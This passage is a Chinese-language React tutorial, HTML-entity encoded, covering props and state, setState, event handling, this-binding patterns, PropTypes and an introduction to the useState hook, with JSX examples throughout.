<p>&#x7C7B;&#x7EC4;&#x4EF6;&#x7684;&#x5177;&#x4F53;&#x6E32;&#x67D3;&#x6548;&#x679C;&#x4F9D;&#x9760;&#x6E32;&#x67D3;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x6E32;&#x67D3;&#x51FD;&#x6570;&#x5FC5;&#x987B;&#x6709;&#x8868;&#x793A;&#x8BE5;&#x7EC4;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#x89E3;&#x6790;&#x7C7B;&#x7EC4;&#x4EF6;&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x4F1A;&#x5148; new &#x51FA;&#x8BE5;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#xFF0C;&#x5E76;&#x8C03;&#x7528;&#x539F;&#x578B;&#x4E0A;&#x7684; render &#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-jsx">ReactDom.render(&lt;App&gt;, document.getElementById(&quot;#root&quot;)) // &#x81EA;&#x52A8;&#x8F6C;&#x6362;&#x4EE5;&#x4E0B;&#x5199;&#x6CD5;
ReactDom.render(new App({name: react}).render(), document.getElementById(&quot;#root&quot;)) 
</code></pre>
<p>&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x548C;&#x7C7B;&#x7EC4;&#x4EF6;&#x5728;&#x4E0D;&#x9700;&#x8981;&#x6E32;&#x67D3;&#x5185;&#x5BB9;&#x65F6;&#x53EF;&#x76F4;&#x63A5;&#x8FD4;&#x56DE; null&#x3002;</p>
<p>&#x9664;&#x975E;&#x8981;&#x5BF9;&#x5B9E;&#x4F8B;&#x521D;&#x59CB;&#x5316;&#x6307;&#x5B9A;&#x5C5E;&#x6027;&#xFF0C;&#x7C7B;&#x7EC4;&#x4EF6;&#x7684;&#x6784;&#x9020;&#x5668;&#x4E0D;&#x662F;&#x5FC5;&#x987B;&#x7684;&#x3002;&#x5F53;&#x5B50;&#x7C7B;&#x7EE7;&#x627F;&#x7236;&#x7C7B;&#xFF0C;&#x4E14;&#x5B50;&#x7C7B;&#x6307;&#x5B9A;&#x6784;&#x9020;&#x5668;&#x65F6;&#xFF0C;&#x5B50;&#x7C7B;&#x6784;&#x9020;&#x5668;&#x4E2D;&#x7684; super &#x51FD;&#x6570;&#x5FC5;&#x987B;&#x8C03;&#x7528;&#x3002;&#x56E0;&#x4E3A;&#x5B50;&#x7C7B;&#x7EE7;&#x627F;&#x7236;&#x7C7B;&#x65F6;&#x6CA1;&#x6709; this&#xFF0C;&#x9700;&#x901A;&#x8FC7; super &#x7ED1;&#x5B9A;&#x7236;&#x7C7B;&#x7684; this&#xFF0C;&#x540C; sup.prototype.constructor.call(sub)&#x3002;</p>
<ul>
<li>&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;&#x5C5E;&#x6027; state &amp; props</li>
</ul>
<blockquote>
<p>&#x81EA;&#x5B9A;&#x4E49;&#x7EC4;&#x4EF6;&#x4F1A;&#x5C06; JSX &#x6240;&#x63A5;&#x6536;&#x7684;&#x5C5E;&#x6027; attributes &#x4EE5;&#x53CA;&#x5B50;&#x7EC4;&#x4EF6; children &#x8F6C;&#x6362;&#x4E3A;&#x5355;&#x4E2A;&#x5BF9;&#x8C61;&#x4F20;&#x9012;&#x7ED9;&#x7EC4;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x88AB;&#x79F0;&#x4E4B;&#x4E3A; props&#x3002;<br>
&#x7EC4;&#x4EF6;&#x65E0;&#x8BBA;&#x662F;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#x58F0;&#x660E;&#x8FD8;&#x662F;&#x901A;&#x8FC7; class &#x58F0;&#x660E;&#xFF0C;&#x90FD;&#x7EDD;&#x4E0D;&#x80FD;&#x4FEE;&#x6539;&#x81EA;&#x8EAB;&#x7684; props&#x3002;</p>
</blockquote>
<pre><code class="language-jsx">function Hello(props) { return &lt;h1&gt;Hello, {props.name}&lt;/h1&gt;; }
// class Hello extends React.Component { render() { return &lt;h1&gt;Hello, {this.props.name}&lt;/h1&gt;; } }
const root = ReactDOM.createRoot(document.getElementById(&apos;root&apos;));
const element = &lt;Hello name=&quot;IcedAmericano&quot; /&gt;;
root.render(element);
</code></pre>
<blockquote>
<p>state &#x4E0E; props &#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x662F; state &#x662F;&#x79C1;&#x6709;&#x7684;&#xFF0C;&#x5E76;&#x4E14;&#x5B8C;&#x5168;&#x53D7;&#x63A7;&#x4E8E;&#x5F53;&#x524D;&#x7EC4;&#x4EF6;&#xFF0C;&#x662F;&#x7EC4;&#x4EF6;&#x7684;&#x5185;&#x90E8;&#x72B6;&#x6001;&#x3002;</p>
</blockquote>
<p>&#x76F4;&#x63A5;&#x4FEE;&#x6539; state &#x5E76;&#x4E0D;&#x4F1A;&#x91CD;&#x65B0;&#x6E32;&#x67D3;&#x7EC4;&#x4EF6;&#xFF0C;state &#x4FEE;&#x6539;&#x5E94;&#x8BE5;&#x4F7F;&#x7528; setState()&#x3002;setState() &#x7684;&#x4F5C;&#x7528;&#x662F;&#x4FEE;&#x6539; state &#x5E76;&#x66F4;&#x65B0;&#x9875;&#x9762;&#x3002;&#x6784;&#x9020;&#x51FD;&#x6570;&#x662F;&#x552F;&#x4E00;&#x80FD;&#x7ED9; this.state &#x8D4B;&#x503C;&#x7684;&#x4F4D;&#x7F6E;&#x3002;</p>
<pre><code class="language-jsx">this.state.comment = &apos;Hello&apos;; // Wrong
this.setState({comment: &apos;Hello&apos;}); // Correct
</code></pre>
<blockquote>
<p>state &#x7684;&#x66F4;&#x65B0;&#x53EF;&#x80FD;&#x662F;&#x5F02;&#x6B65;&#x7684;&#x3002;&#x51FA;&#x4E8E;&#x6027;&#x80FD;&#x8003;&#x8651;&#xFF0C;React &#x53EF;&#x80FD;&#x4F1A;&#x628A;&#x591A;&#x4E2A; setState() &#x8C03;&#x7528;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x8C03;&#x7528;&#x3002;&#x56E0;&#x4E3A; this.props &#x548C; this.state &#x53EF;&#x80FD;&#x4F1A;&#x5F02;&#x6B65;&#x66F4;&#x65B0;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x8981;&#x4F9D;&#x8D56;&#x8FD9;&#x4E9B;&#x503C;&#x6765;&#x66F4;&#x65B0;&#x4E0B;&#x4E00;&#x4E2A;&#x72B6;&#x6001;&#x3002;&#x8981;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9; <a href="https://zh-hans.reactjs.org/docs/react-component.html#setstate">setState()</a> &#x63A5;&#x6536;&#x51FD;&#x6570;&#x800C;&#x4E0D;&#x662F;&#x5BF9;&#x8C61;&#x3002;</p>
</blockquote>
<p>&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x53C2;&#x6570;&#x662F;&#x4F20;&#x5165;&#x51FD;&#x6570;&#x53C2;&#x6570;&#x7684;&#x8BED;&#x6CD5;&#x7CD6;&#x3002;&#x82E5;&#x65B0;&#x72B6;&#x6001;&#x4E0D;&#x4F9D;&#x8D56;&#x4E8E;&#x539F;&#x72B6;&#x6001;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5BF9;&#x8C61;&#x53C2;&#x6570;&#xFF1B;&#x82E5;&#x65B0;&#x72B6;&#x6001;&#x4F9D;&#x8D56;&#x4E8E;&#x539F;&#x72B6;&#x6001;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x51FD;&#x6570;&#x53C2;&#x6570;&#x3002;</p>
<pre><code class="language-jsx">this.setState({ counter: this.state.counter + this.props.increment }); // Wrong
this.setState((state, props) =&gt; ({ counter: state.counter + props.increment })); // Correct
this.setState(function(state, props) { return { counter: state.counter + props.increment }; }); // Correct
</code></pre>
<p>setState() =&gt; &#x662F;&#x4E3B;&#x7EBF;&#x7A0B;&#x8C03;&#x7528;&#x7684;&#x540C;&#x6B65;&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x5176;&#x66F4;&#x65B0;&#x6570;&#x636E;&#x72B6;&#x6001;&#x7684;&#x52A8;&#x4F5C;&#x662F;&#x5F02;&#x6B65;&#x7684;&#x3002;</p>
<p>&#x51FD;&#x6570; render &#x4E2D;&#x4E0D;&#x80FD;&#x8C03;&#x7528; setState()&#x3002;&#x6E32;&#x67D3;&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x7EAF;&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x5B8C;&#x5168;&#x53D6;&#x51B3;&#x4E8E; this.state &#x548C; this.props&#xFF0C;&#x671F;&#x95F4;&#x4E0D;&#x5E94;&#x8BE5;&#x9020;&#x6210;&#x4EFB;&#x4F55;&#x526F;&#x4F5C;&#x7528;&#xFF08;&#x526F;&#x4F5C;&#x7528;&#x5373;&#x72B6;&#x6001;&#x6539;&#x53D8;&#xFF09;&#x3002;</p>
<blockquote>
<p>React <a href="https://reactjs.org/docs/state-and-lifecycle.html#the-data-flows-down">&#x5355;&#x5411;&#x6570;&#x636E;&#x6D41;</a> =&gt; &#x4EFB;&#x4F55;&#x7684; state &#x603B;&#x662F;&#x6240;&#x5C5E;&#x4E8E;&#x7279;&#x5B9A;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x4E14;&#x4ECE;&#x8BE5; state &#x6D3E;&#x751F;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x6216; UI &#x53EA;&#x80FD;&#x5F71;&#x54CD;&#x6811;&#x4E2D;&quot;&#x66F4;&#x4F4E;&quot;&#x7684;&#x7EC4;&#x4EF6;&#x3002;</p>
</blockquote>
<iframe src="https://codesandbox.io/embed/comment-react-uh0yil?fontsize=14&amp;hidenavigation=1&amp;theme=dark" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="Comment-React" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<ul>
<li>
<p>&#x5217;&#x8868;&#x6E32;&#x67D3; <a href="https://reactjs.org/docs/lists-and-keys.html#keys">key</a> &#x5E94;&#x5C31;&#x8FD1;&#x6570;&#x7EC4;&#x4E0A;&#x4E0B;&#x6587;&#xFF1B;&#x5728; map() &#x65B9;&#x6CD5;&#x4E2D;&#x5143;&#x7D20;&#x9700;&#x8981;&#x8BBE;&#x7F6E; key &#x5C5E;&#x6027;</p>
</li>
<li>
<p><a href="https://reactjs.org/docs/forms.html#controlled-components">&#x53D7;&#x63A7;&#x7EC4;&#x4EF6;</a> =&gt; React &#x7684;&#x8868;&#x5355;&#x5143;&#x7D20;&#x81EA;&#x884C;&#x7EF4;&#x62A4; state&#xFF0C;&#x5E76;&#x6839;&#x636E;&#x7528;&#x6237;&#x8F93;&#x5165;&#x8FDB;&#x884C;&#x66F4;&#x65B0;</p>
</li>
</ul>
<h3 id="handling-events">Handling Events</h3>
<p>React <a href="https://reactjs.org/docs/handling-events.html">&#x4E8B;&#x4EF6;</a>&#x7684;&#x547D;&#x540D;&#x91C7;&#x7528; camelCase&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x7EAF;&#x5C0F;&#x5199;&#xFF1B;&#x5728; JSX &#x8BED;&#x6CD5;&#x4E2D;&#x9700;&#x8981;&#x4F20;&#x5165;&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x3002;</p>
<pre><code class="language-jsx">&lt;button onclick=&quot;btnFunc()&quot;&gt;Click me&lt;/button&gt; // &#x539F;&#x751F;&#x6807;&#x7B7E;&#x5185;&#x8C03;&#x7528;&#x51FD;&#x6570;
</code></pre>
<p>&#x7C7B;&#x7EC4;&#x4EF6;&#x7ED1;&#x5B9A;&#x4E8B;&#x4EF6;&#x51FD;&#x6570;&#x65F6;&#x9700;&#x8981;&#x7528;&#x5230; this&#xFF0C;&#x4EE3;&#x8868;&#x6307;&#x5411;&#x5F53;&#x524D;&#x7684;&#x7C7B;&#x7684;&#x5F15;&#x7528;&#xFF1B;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x4E2D;&#x4E0D;&#x9700;&#x8981;&#x8C03;&#x7528; this&#x3002;</p>
<pre><code class="language-jsx">&lt;button onClick={btnFunc}&gt;Click me&lt;/button&gt; // React
</code></pre>
<p>&#x5143;&#x7D20;&#x5728; JSX &#x4E2D;&#x6240;&#x7ED1;&#x5B9A;&#x7684;&#x4E8B;&#x4EF6;&#x5148;&#x4F1A;&#x7ECF; Babel &#x8F6C;&#x6362;&#x6210; React.createElement &#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x518D;&#x8F6C;&#x6210; fiber &#x5BF9;&#x8C61;&#x3002;&#x5BF9;&#x8C61;&#x5C5E;&#x6027; memoizedProps &#x548C; pendingProps &#x4FDD;&#x5B58;&#x5177;&#x4F53;&#x4E8B;&#x4EF6;&#x3002;</p>
<pre><code class="language-jsx">&lt;button onClick={ this.handerClick }&gt;Click Me&lt;/button&gt;
React.createElement (&quot;button&quot;, { onClick: this.handerClick }, &quot;\u{43}\u{6c}\u{69}\u{63}\u{6b}\u{20}\u{4d}\u{65}&quot;)
child: FiberNode { memoizedProps: {children: &quot;Click Me&quot;, onClick: f}, pendingProps: {children: &quot;Click Me&quot;, onClick: f} }
</code></pre>
<p>React 17 &#x4E0D;&#x518D;&#x5C06;&#x4E8B;&#x4EF6;&#x6DFB;&#x52A0;&#x4E8E; document&#xFF0C;&#x800C;&#x662F;&#x7ED1;&#x5B9A;&#x6839;&#x8282;&#x70B9;&#x5BB9;&#x5668;&#x3002;&#x65B9;&#x4FBF;&#x5C40;&#x90E8;&#x5347;&#x7EA7;&#x3002;</p>
<pre><code class="language-jsx">const rootNodeContainer = document.getElementById(&apos;root&apos;);
ReactDOM.render(&lt;App /&gt;, rootNodeContainer);
</code></pre>
<p>&#x4E8B;&#x4EF6;&#x4E0D;&#x4F1A;&#x6CE8;&#x518C;&#x5728;&#x5177;&#x4F53;&#x5143;&#x7D20;&#x8282;&#x70B9;&#xFF0C;&#x800C;&#x662F;&#x91C7;&#x53D6;&#x4E8B;&#x4EF6;&#x4EE3;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5229;&#x7528;&#x5192;&#x6CE1;&#x6307;&#x5B9A;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x7B49;&#x5192;&#x6CE1;&#x5230;&#x6839;&#x8282;&#x70B9;&#x518D;&#x901A;&#x8FC7; event.target &#x627E;&#x5230;&#x771F;&#x5B9E;&#x89E6;&#x53D1;&#x7684;&#x4E8B;&#x4EF6;&#x6E90;&#x3002;</p>
<pre><code class="language-jsx">// &#x771F;&#x5B9E;&#x8282;&#x70B9;&#x4E0A;&#x7684;&#x5904;&#x7406;&#x51FD;&#x6570;&#x88AB;&#x66FF;&#x6362;&#x4E3A;&#x7A7A;&#x51FD;&#x6570; noop
elementName
  useCapture: false
  passive: false
  once: false
  handler: f noop()
</code></pre>
<p>&#x5E76;&#x975E;&#x5728;&#x521D;&#x59CB;&#x65F6;&#x5C06;&#x6240;&#x6709;&#x4E8B;&#x4EF6;&#x7ED1;&#x5B9A;&#x5728;&#x6839;&#x8282;&#x70B9;&#x5BB9;&#x5668;&#x4E0A;&#xFF0C;&#x800C;&#x662F;&#x91C7;&#x53D6;&#x6309;&#x9700;&#x7ED1;&#x5B9A;&#xFF0C;&#x5728;&#x53D1;&#x73B0;&#x5177;&#x4F53;&#x5408;&#x6210;&#x4E8B;&#x4EF6;&#x540E;&#xFF0C;&#x518D;&#x53BB;&#x7ED1;&#x5B9A;&#x6839;&#x8282;&#x70B9;&#x5BB9;&#x5668;&#x7684;&#x539F;&#x751F;&#x4E8B;&#x4EF6;&#x3002;&#x4E8B;&#x4EF6;&#x89E6;&#x53D1;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x8C03;&#x5EA6;&#x79BB;&#x6563;&#x4E8B;&#x4EF6;&#x51FD;&#x6570; dispatchDiscreteEvent &#x5C06;&#x6307;&#x5B9A;&#x7684;&#x51FD;&#x6570;&#x6267;&#x884C;&#x3002;</p>
<blockquote>
<p>React <a href="https://reactjs.org/docs/events.html">&#x5408;&#x6210;&#x4E8B;&#x4EF6;</a> SyntheticEvent &#x662F;&#x6A21;&#x62DF;&#x539F;&#x751F; DOM &#x4E8B;&#x4EF6;&#x6240;&#x6709;&#x80FD;&#x529B;&#x7684;&#x4E8B;&#x4EF6;&#x5BF9;&#x8C61;&#xFF0C;&#x5373;&#x6D4F;&#x89C8;&#x5668;&#x539F;&#x751F;&#x4E8B;&#x4EF6;&#x7684;&#x8DE8;&#x6D4F;&#x89C8;&#x5668;&#x5305;&#x88C5;&#x5668;&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x6B64;&#x5916;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x8FD4;&#x56DE; false &#x7684;&#x65B9;&#x5F0F;&#x963B;&#x6B62;&#x9ED8;&#x8BA4;&#x884C;&#x4E3A;&#x3002;&#x5FC5;&#x987B;&#x663E;&#x5F0F;&#x5730;&#x4F7F;&#x7528; preventDefault&#x3002;</p>
</blockquote>
<pre><code class="language-jsx">// &#x4F20;&#x7EDF;&#x7684; HTML &#x4E2D;&#x963B;&#x6B62;&#x8868;&#x5355;&#x7684;&#x9ED8;&#x8BA4;&#x63D0;&#x4EA4;&#x884C;&#x4E3A;
&lt;form onsubmit=&quot;console.log(&apos;You clicked submit.&apos;); return false&quot;&gt;
  &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<pre><code class="language-jsx">// React
function Form() {
  function handleSubmit(e) { e.preventDefault(); console.log(&apos;You clicked submit.&apos;); }
  return (
    &lt;form onSubmit={handleSubmit}&gt;
      &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;
    &lt;/form&gt;
  );
}
</code></pre>
<ul>
<li>this for the methods in JSX</li>
</ul>
<p>render &#x4E2D; this &#x6307;&#x5411;&#x7C7B;&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;&#xFF0C;&#x4E0E; render &#x5E73;&#x7EA7;&#x7684;&#x65B9;&#x6CD5;&#x4E2D; this &#x4E3A; undefined&#x3002;</p>
<p>&#x5904;&#x7406;&#x4E8B;&#x4EF6;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x4E2D; this &#x7684;&#x6307;&#x5411;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x4E0E; bind &#x7ED1;&#x5B9A;&#x3002;</p>
<pre><code class="language-jsx">/* &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x5728; render &#x4E2D;&#x4F7F;&#x7528;&#x884C;&#x5185;&#x7BAD;&#x5934;&#x51FD;&#x6570; */
class ArrowFunctionBindTest extends React.Component {
  // handleFunc() { console.log(&apos;this is:&apos;, this); };
  handleFunc = () =&gt; { console.log(&apos;this is:&apos;, this); };
  render() {
    return (
      // &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x8868;&#x793A; =&gt; &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x53EF;&#x4F7F;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x8868;&#x793A;&#x6216;&#x51FD;&#x6570;&#x58F0;&#x660E;&#x8868;&#x793A;
      // &#x7BAD;&#x5934;&#x51FD;&#x6570; this &#x6307;&#x5411;&#x5916;&#x90E8;&#x51FD;&#x6570;&#x7684; this =&gt; &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x56E0;&#x81EA;&#x4E3B;&#x8C03;&#x7528; this &#x6307;&#x5411;&#x7C7B;&#x7EC4;&#x4EF6;&#x5B9E;&#x4F8B;
      &lt;button onClick={() =&gt; this.handleFunc()}&gt;
        Click me
      &lt;/button&gt;
    );
  }
}
</code></pre>
<pre><code class="language-jsx">/* &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x7EC4;&#x4EF6;&#x5185;&#x4F7F;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x5B9A;&#x4E49;&#x65B9;&#x6CD5; */
class ArrowFunctionBindTest extends React.Component {
  handleFunc = () =&gt; { console.log(&apos;this is:&apos;, this); }; // &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x8868;&#x793A;
  render() {
    return (
      &lt;button onClick={ this.handleFunc }&gt;
        Click me
      &lt;/button&gt;
    );
  }
}
</code></pre>
<pre><code class="language-jsx">/* &#x65B9;&#x5F0F;&#x4E09; =&gt; &#x5728; render &#x4E2D;&#x5BF9;&#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x7ED1;&#x5B9A; this */
class ArrowFunctionBindTest extends React.Component {
  handleFunc() { console.log(&apos;this is:&apos;, this); }
  // handleFunc = () =&gt; { console.log(&apos;this is:&apos;, this); };
  render() {
    return (
      // &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x7528; bind &#x7ED1;&#x5B9A; =&gt; &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x53EF;&#x4F7F;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x8868;&#x793A;&#x6216;&#x51FD;&#x6570;&#x58F0;&#x660E;&#x8868;&#x793A;
      &lt;button onClick={ this.handleFunc.bind(this) }&gt;
        Click me
      &lt;/button&gt;
    );
  }
}
</code></pre>
<pre><code class="language-jsx">/* &#x65B9;&#x5F0F;&#x56DB; =&gt; &#x5728;&#x6784;&#x9020;&#x5668;&#x4E2D;&#x7ED1;&#x5B9A; this */
class ArrowFunctionBindTest extends React.Component {
  constructor(props) {
    super(props)
    // &#x539F;&#x578B; handleFunc &#x4E2D; this &#x6307;&#x5411;&#x5B9E;&#x4F8B; =&gt; bind &#x7684;&#x51FD;&#x6570;&#x6302;&#x8F7D;&#x5230;&#x5B9E;&#x4F8B;&#x81EA;&#x8EAB;&#x5E76;&#x547D;&#x540D;&#x4E3A; handleFunc
    this.handleFunc = this.handleFunc.bind(this)
  }
  handleFunc() { console.log(&apos;this is:&apos;, this); }
  // handleFunc = () =&gt; { console.log(&apos;this is:&apos;, this); };
  render() {
    return (
      // &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x7528; bind &#x7ED1;&#x5B9A; =&gt; &#x56DE;&#x8C03;&#x51FD;&#x6570;&#x53EF;&#x4F7F;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x8868;&#x793A;&#x6216;&#x51FD;&#x6570;&#x58F0;&#x660E;&#x8868;&#x793A;
      &lt;button onClick={ this.handleFunc }&gt;
        Click me
      &lt;/button&gt;
    );
  }
}
</code></pre>
<pre><code class="language-jsx">/* &#x65B9;&#x5F0F;&#x4E94; =&gt; &#x4E8B;&#x4EF6;&#x5904;&#x7406;&#x51FD;&#x6570;&#x7528;&#x7BAD;&#x5934;&#x51FD;&#x6570;&#x8868;&#x793A;&#x4E14;&#x76F4;&#x63A5;&#x5199;&#x56DE;&#x8C03;&#x51FD;&#x6570; */
class ArrowFunctionBindTest extends React.Component {
  render() {
    return (
      &lt;button onClick={ () =&gt; { console.log(&apos;this is:&apos;, this); } }&gt;
        Click me
      &lt;/button&gt;
    );
  }
}
</code></pre>
<p>&#x81EA;&#x884C;&#x5C01;&#x88C5;&#x7684;&#x7EC4;&#x4EF6;&#x8FDB;&#x884C; <a href="https://zh-hans.reactjs.org/docs/typechecking-with-proptypes.html">props &#x6821;&#x9A8C;</a>&#xFF1A;</p>
<ol>
<li>&#x5B89;&#x88C5;&#xFF1A;<code>yarn add prop-types</code></li>
<li>&#x5BFC;&#x5165; PropTypes&#xFF1A;<code>import PropTypes from &apos;prop-types&apos;</code></li>
<li>&#x7ED9;&#x7EC4;&#x4EF6;&#x5C5E;&#x6027;&#x6DFB;&#x52A0; props &#x6821;&#x9A8C;&#xFF1A;</li>
</ol>
<pre><code class="language-jsx">&#x7EC4;&#x4EF6;.propTypes = {
    &#x5C5E;&#x6027;1: PropTypes.string.isrequired,
    &#x5C5E;&#x6027;2: PropTypes.func
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="react-hooks-react168">React Hooks =&gt; React16.8</h2>
<blockquote>
<p>Hook &#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x7F16;&#x5199;&#x7C7B;&#x7EC4;&#x4EF6;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F7F;&#x7528;&#x72B6;&#x6001;&#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x7684; React &#x7279;&#x6027;&#x3002;</p>
</blockquote>
<blockquote>
<p>React &#x590D;&#x7528;&#x7EC4;&#x4EF6;&#x7684;&#x903B;&#x8F91;&#x901A;&#x5E38;&#x4F1A;&#x91C7;&#x7528; render prop &#x6216; HOC&#xFF0C;&#x4F46;&#x8FD9;&#x4F1A;&#x5B58;&#x5728;&#x5D4C;&#x5957;&#x5730;&#x72F1;&#x7684;&#x95EE;&#x9898;&#x3002;Hook &#x4ECE;&#x7EC4;&#x4EF6;&#x4E2D;&#x63D0;&#x53D6;&#x72B6;&#x6001;&#x903B;&#x8F91;&#xFF0C;&#x5373;&#x53EF;&#x5728;&#x65E0;&#x9700;&#x4FEE;&#x6539;&#x7EC4;&#x4EF6;&#x7ED3;&#x6784;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x590D;&#x7528;&#x72B6;&#x6001;&#x903B;&#x8F91;&#x3002;</p>
</blockquote>
<p>Hook &#x672C;&#x8D28;&#x662F; JavaScript &#x51FD;&#x6570;&#x3002;Hook &#x53EA;&#x5728;&#x6700;&#x9876;&#x5C42;&#x4F7F;&#x7528;&#x3001;&#x53EA;&#x5728; React &#x51FD;&#x6570;&#x4E2D;&#x8C03;&#x7528;&#x3002;</p>
<h3 id="%E8%87%AA%E5%8F%98%E9%87%8F-hook">&#x81EA;&#x53D8;&#x91CF; Hook</h3>
<ul>
<li>&#x7EAF;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x6CA1;&#x6709;&#x72B6;&#x6001; =&gt; &#x901A;&#x8FC7; useState &#x4E3A;&#x51FD;&#x6570;&#x7EC4;&#x4EF6;&#x5F15;&#x5165;&#x72B6;&#x6001;</li>
</ul>
<pre><code class="language-jsx">setXxx(newValue) or setXxx(value =&gt; newValue)
</code></pre>
<p>useState &#x63A5;&#x53D7;&#x72B6;&#x6001;&#x7684;&#x521D;&#x59CB;&#x503C;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x3002;useState &#x7684;&#x8FD4;&#x56DE;&#x503C;&#x901A;&#x8FC7;&#x6570;&#x7EC4;&#x89E3;&#x6784;&#x521B;&#x5EFA;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#x548C;&#x66F4;&#x65B0;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#x7684;&#x51FD;&#x6570;&#x3002;</p>
<pre><code class="language-js">import React, { useState } from &quot;react&quot;;

function UseStateHook() {
  const [name, setName] = useState(&quot;hello useState&quot;);
  const [age, setAge] = useState(22);
  const [work, setWork] = useState(&quot;frontendenv&quot;);
  return (
    &lt;div&gt;
      &lt;span&gt;{name}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;span&gt;{age}&lt;/span&gt;&amp;nbsp;&amp;nbsp;
      &lt;span&gt;{work}&lt;/span&gt;&amp;nbsp;
      &lt;br /&gt;
      &lt;button
        onClick={() =&gt; {
          setName((name) =&gt; name.split(&quot;&quot;).reverse().join(&quot;&quot;));
        }}
      &gt;
        change my name
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          setAge(age + 1);
        }}
      &gt;
        click me add age
      &lt;/button&gt;
      &lt;button
        onClick={() =&gt; {
          setWork(&quot;fullstack&quot;);
        }}
      &gt;
        what&apos;s my field
      &lt;/button&gt;
    &lt;/div&gt;
  );
}
export default UseStateHook;
</code></pre>
<p>&#x82E5;&#x4F7F;&#x7528;&#x5355;&#x4E2A;&#x72B6;&#x6001;&#x53D8;&#x91CF;&#xFF0C;&#x6BCF;&#x6B21;&#x66F4;&#x65B0;&#x72B6;&#x6001;&#x65F6;&#x9700;&#x8981;&#x5408;&#x5E76;&#x4E4B;&#x524D;&#x7684;&#x72B6;&#x6001;&#x3002;&#x7C7B;&#x7EC4;&#x4EF6; setState &#x4F1A;&#x628A;&#x66F4;&#x65B0;&#x7684;&#x5B57;&#x6BB5;&#x81EA;&#x52A8;&#x5408;&#x5E76;&#x5230;&#x72B6;&#x6001;&#x5BF9;&#x8C61;&#xFF0C;&#x800C; useState &#x8FD4;&#x56DE;&#x7684; setXxx &#x4F1A;&#x66FF;&#x6362;&#x539F;&#x6765;&#x7684;&#x503C;&#x3002;</p>
<pre><code class="language-js">const [state, setState] = useState({ key01: val01, key02: val02, key03: val03, key04: val04 });
